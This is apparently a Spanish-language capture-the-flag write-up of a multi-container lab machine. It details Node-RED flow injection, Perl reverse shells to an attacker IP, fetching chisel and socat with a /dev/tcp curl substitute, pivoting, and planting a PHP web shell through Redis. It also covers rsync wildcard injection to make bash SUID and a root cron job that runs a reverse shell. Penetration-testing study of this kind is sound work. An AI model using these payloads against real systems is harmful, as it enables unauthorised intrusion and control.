## Vuln exploit & Gaining Access {-}

### Ganando acceso con Node-RED {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Copiamos el json y lo copiamos en la web

    ```bash
    echo '[{"id":"7235b2e6.4cdb9c","type":"tab","label":"Flow 1"},{"id":"d03f1ac0.886c28","type":"tcp out","z":"7235b2e6.4cdb9c","host":"","port":"","beserver":"reply","base64":false,"end":false,"name":"","x":786,"y":350,"wires":[]},{"id":"c14a4b00.271d28","type":"tcp in","z":"7235b2e6.4cdb9c","name":"","server":"client","host":"10.10.14.29","port":"443","datamode":"stream","datatype":"buffer","newline":"","topic":"","base64":false,"x":281,"y":337,"wires":[["4750d7cd.3c6e88"]]},{"id":"4750d7cd.3c6e88","type":"exec","z":"7235b2e6.4cdb9c","command":"","addpay":true,"append":"","useSpawn":"false","timer":"","oldrc":false,"name":"","x":517,"y":362.5,"wires":[["d03f1ac0.886c28"],["d03f1ac0.886c28"],["d03f1ac0.886c28"]]}]' | xclip -sel clip
    ```

    Y lo pegamos en Menu > import > Clipboard. Dandole a **import**, vemos un nuevo diagrama

1. Lanzamos el exploit dandole al boton **Deploy**

Ya ganamos acceso al systema pero viendo que somos root, esto significa que estamos en un contenedor.

Aqui intentamos hacer un tratamiento de la TTY pero vemos que no le gusta.

```bash
which python
which python2.7
which python3
which perl
```

como vemos que la maquina tiene **perl**, vamos a entablarnos una nueva reverse shell con perl.

1. nos ponemos nuevamente en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. desde la shell que tenemos en el contenedor lanzamos un shell reversa con perl

    ```bash
    perl -e 'use Socket;$i="10.10.14.29";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    ```

#### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Salir del contenedor {-}

```bash
cd /
ls -la
cd /home
ls -la
cd /node
ls -la
cd /var
ls -la
cd backups
ls -la
cd ..
cd /opt
cd yarn-v1.6.0
ls -la
cat package.json
find \-name *config* 2>/dev/null
```

No vemos nada en concreto para este contenedor. Aqui tendremos que saltar del contenedor

```bash
ip a
```

Vemos que hay una interface **eth0** con un inet address **172.18.0.2** y el interface **eth1** con un inet address **172.19.0.4**.
Como el contenedor tiene **ping** installado, nos creamos un script en bash para saber que otras maquinas/contenedores estan activos.

```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        tput cnorm;exit 1
}

#Ctrl+C
trap ctrl_c INT

networks=(172.18.0 172.19.0)

tput civis; for network in ${networks[@]}; do
        echo -e "\n[+] Enumerando el network $network.0/24:"
        for i in $(seq 1 254); do
                timeout 1 bash -c "ping -c 1 $network.$i" &>/dev/null && echo -e "\t Host $network.$i - ACTIVE" &
        done;wait
done; tput cnorm
```

Lo podemos transferir con base64 y darle derechos de ejecucion.

```bash
chmod +x hostScan.sh
./hostScan.sh
```

y podemos ver hosts activos como

- 172.18.0.1 <-- Maquina Host
- 172.18.0.2 <-- (nodered) [PWNED]
- 172.19.0.1 <-- Maquina Host
- 172.19.0.2
- 172.19.0.3
- 172.19.0.4 <-- (nodered) [PWNED]

ahora que tenemos un listeo de las ips, vamos a por un scanPorts.

```bash
#!/bin/bash

function ctrl_c(){
        echo -e "\n\n[!] Saliendo...\n"
        tput cnorm;exit 1
}

#Ctrl+C
trap ctrl_c INT

hosts=(172.18.0.1 172.18.0.2 172.19.0.1 172.19.0.2 172.19.0.3 172.19.0.4)

tput civis; for host in ${hosts[@]}; do
        echo -e "\n[+] Enumerando puertos para el host $hosts:"
        for port in $(seq 1 65535); do
                timeout 1 bash -c "echo '' > /dev/tcp/$host/$port" 2>/dev/null && echo -e "\t Port $port - OPEN" &
        done;wait
done; tput cnorm
```

Copiamos con base64 al contenedor, le damos derechos de ejecucion y lo ejecutamos. Vemos lo siguiente

- 172.18.0.1 <-- Maquina Host  

    [+] Port 1880 - OPEN
- 172.18.0.2 <-- (nodered) [PWNED]  
    [+] Port 1880 - OPEN
- 172.19.0.1 <-- Maquina Host  
    ---------------------
- 172.19.0.2
    [+] Port 6379 - OPEN  
- 172.19.0.3
    [+] Port 80 - OPEN  
- 172.19.0.4 <-- (nodered) [PWNED]  
    [+] Port 1880 - OPEN


Para poder ver lo que hay debajo estos puerto podemos lanzar un reverse port forwarding.

### Reverse Port Forwarding con Chisel {-}

Instalamos y configuramos **Chisel**.

1. Descarga de chisel y build

    ```bash
    git clone https://github.com/jpillora/chisel
    cd chisel
    go build -ldflags "-w -s" .
    upx chisel
    chmod +x chisel
    ```

1. Enviamos chisel a la maquina victima

    Como el contenedor no tiene curl instalado tratamos de crear una funccion curl.

    ```bash
    function __curl() {
        read proto server path <<<$(echo ${1//// })
        DOC=/${path// //}
        HOST=${server//:*}
        PORT=${server//*:}
        [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

        exec 3<>/dev/tcp/${HOST}/$PORT
        echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
        (while read line; do
        [[ "$line" == $'\r' ]] && break
        done && cat) <&3
        exec 3>&-
    }
    ```

    - en la maquina de atacante

        ```bash
        python3 -m http.server 80
        ```

    - en la maquina victima

        ```bash
        cd /tmp
        __curl http://10.10.14.29/chisel > chisel
        chmod +x chisel
        ```

1. En la maquina de atacante creamos un servidor 

    ```bash
    ./chisel server --reverse -p 1234
    ```

1. En la maquina victima creamos un cliente 

    ```bash
    ./chisel client 10.10.14.29:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
    ```

Desde nuestra maquina de atacante podemos con firefox connectarnos a `http://localhost` y podemos ver la web del puerto 80 de la 172.19.0.3.
A demas podemos lanzar un `nmap -sCV -p6379 127.0.0.1`. En el codigo fuente de la pagina web vemos funcciones JS que registran las veces que
cargamos la pagina y el nmap nos muestra un Redis 4.0.9.

### Redis {-}

Como hay un **redis**, S4vi tira directo de la biblia [hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) y seguimos los 
siguientes pasos.

1. Installamos redis-tools

    ```bash
    apt install redis-tools
    ```

1. Miramos de lanzar commandos

    ```bash
    nc 127.0.0.1 3679

    INFO
    client list
    config get *
    ```

1. Intentamos dumpear la base de datos

    ```bash
    select 0
    keys *
    get hits
    ```

Aqui podemos ver que hay un veinculo entre la web y la base de datos redis

1. Creamos un fichero php

    ```php



    <?php
        system($_REQUEST['cmd']);
    ?>


    ```
    hay que asegurarse que hayan saltos de linea al principio y al final del fichero

1. Buscamos un directorio en la web

    como vemos que en el JS de la web hay nombres de ficheros raros cojemos uno como por ejemplo el **8924d0659008565c554f8128cd11fda4**

1. Enviamos el fichero php al directorio

    ```bash
    cat cmd.php | redis-cli -h 127.0.0.1 -x set reverse
    redis-cli -h 127.0.0.1 config set dir /var/www/html/8924d0659008565c554f8128cd11fda4/
    redis-cli -h 127.0.0.1 config set dbfilename "cmd.php"
    redis-cli -h 127.0.0.1 save
    ```

1. con firefox vamos a la url `http://localhost/8924d0659008565c554f8128cd11fda4/cmd.php?cmd=whoami`

Aqui vemos que tenemos un RCE activado. Si le ponemos el comando hostname, podemos ver un nuevo segmento que seria el **172.20.0.0/24**.
Como no tenemos connectividad de esta maquina (www) hacia nuestra maquina de atacante, tenemos que passar por la 172.19.0.4 hasta la nuestra.
Por esto usaremos socat

### Ganando Acceso a WWW con puente de coneccion via socat {-}

1. descargamos socat

    ```bash
    wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
    chmod +x socat
    ```

1. subimos el socat al contenedor nodered

    - en la maquina de atacante creamos un servicio http 

        ```bash
        python -m http.server 80
        ```

    - descargamos el socat con la funccion __curl()

        ```bash
        __curl http://10.10.14.29/socat > socat
        chmod +x socat
        ```

1. con socat configuramos el puente en la maquina nodered

    ```bash
    ./socat TCP-LISTEN:1111,fork TCP:10.10.14.29:2222 &
    ```

1. lanzamos nuevamente el chisel cliente

    ```bash
    ./chisel client 10.10.14.29:1234 R:80:172.19.0.3:80 R:6379:172.19.0.2:6379
    ```

1. desde nuestra maquina no ponemos en escucha por el puerto 2222

    ````bash
    nc -nlvp 2222
    ```

1. desde la web entablamos una reverse shell, en este caso no a nuestra maquina, pero a la maquina puente

    ```bash
    http://localhost/8924d0659008565c554f8128cd11fda4/cmd.php?cmd=perl -e 'use Socket;$i="172.19.0.4";$p=1111;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
    ```

Hemos ganado accesso al contenedor www.

#### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

miramos un poco la maquina y vemos que el user.txt esta en el directorio del usuario somaro pero que no tenemos derechos para leer lo. 
Tenemos que escalar privilegios.

```bash
whoami
id
hostname
hostname -I
ifconfig
ip a
cd /
find \-perm -4000 2>/dev/null
```

No vemos nada interessante. Miramos si hay tareas que se ejecutan a intervalo regulares de tiempo. 
Para esto nos creamos el famoso procmon.sh

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Lo podemos enviar por base64 al contenedor **www** y lo ejecutamos. Vemos que hay un fichero backup.sh que se ejecuta

```bash
cat /backup/backup.sh
```

Vemos que entra en un directorio y hace un rsync de todos los ficheros que acaben con la extension .rdb para enviarlos a la maquina backup:873/src/backup, 
y finalmente borra todo lo que hay en /var/www/html y lanza un nuevo rsync para copia todo lo que hay en backup:873/src/backup.

Aqui el problema es que el commando rsync es vulnerable porque utiliza un wildcard (*.rdb). Si vamos a [gtfobins](https://gtfobins.github.io/gtfobins/rsync/#shell),
vemos que podemos lanzar commandos con el parametro -e.

#### Privesc a root del contenedor www {-}

La idea aqui seria crear un fichero con un nombre turbio que contiene -e.

1. creamos un script en bash 

    ```bash
    #!/bin/bash

    chmod u+s /bin/bash
    ```

1. lo enviamos al contenedor por base64 y lo nombramos test.rdb en el directorio /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
1. en el directorio /var/www/html/f187a0ec71ce99642e4f0afbd441a68b creamos un nuevo fichero

    ```bash
    touch -- '-e sh test.rdb'
    ```

Esperamos un poco y podemos ver que la bash es SUID y que con el comando `bash -p` nos convertimos en root y podemos leer la flag.
Como ya podemos utilizar ping, vamos a ver que maquina es la backup.

```bash
ping -c 1 backup
```

vemos que backup es la 172.20.0.3. Tambien podemos usar del rsync para ver los ficheros del backup. Vamos a subir el socat al contenedor www.
Como **www** tiene connectividad con la maquina **nodered**, y que esta tiene connectividad con socat (1111 <--> 2222) a nuestra maquina, podemos
usar de esto para subir ficheros.

### Ganando acceso al contenedor Backup {-}

1. Creamos la funccion __curl al contenedor www

    ```bash
    function __curl() {
        read proto server path <<<$(echo ${1//// })
        DOC=/${path// //}
        HOST=${server//:*}
        PORT=${server//*:}
        [[ x"${HOST}" == x"${PORT}" ]] && PORT=80

        exec 3<>/dev/tcp/${HOST}/$PORT
        echo -en "GET ${DOC} HTTP/1.0\r\nHost: ${HOST}\r\n\r\n" >&3
        (while read line; do
        [[ "$line" == $'\r' ]] && break
        done && cat) <&3
        exec 3>&-
    }
    ```

1. Desde nuestra maquina de atacante lanzamos un servidor http con python hacia el puerto 2222

    ```bash
    python -m http.server 2222
    ```

1. Con la funccion __curl descargamos el socat

    ```bash
    __curl http://172.19.0.4:1111/socat > socat
    ```

Ahora vamos a usar el rsync para modificar los ficheros necesarios para ejecutar codigo desde una tarea cron.

```bash
rsync rsync://172.20.0.3/src/etc/cron.d
echo '* * * * * root sh /tmp/reverse.sh' > reverse
rsync reverse rsync://172.20.0.3/src/etc/cron.d/reverse
```

Ahora vamos a crear el fichero reverse.sh

```bash
perl -e 'use Socket;$i="172.20.0.2";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

Lo enviamos a la maquina www con base64 y lo enviamos con rsync.

```bash
rsync reverse.sh rsync://172.20.0.3/src/tmp/reverse.sh
```

y con socat nos ponemos en escucha por el puerto 7777

```bash
./socat TCP-LISTEN:7777 stdout
```

Esperamos un poco y ganamos acceso al contenedor backup.

#### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

mirando la maquina vemos con el comando `df -h` que hay una montura /dev/sda2 tirando a /backup.
Si miramos un poco los /dev/sda*

```bash
ls -la /dev/sda*

#Output
/dev/sda
/dev/sda1
/dev/sda2
/dev/sda3
```

Montamos los directorios para ver lo que hay

```bash
mkdir /mnt/test
mount /dev/sda2 /mnt/test
cd /mnt/test
ls -la
cd root
ls -la
cat root.txt
```

Podemos leer la flag. Pero como queremos una shell interactiva continuamos.
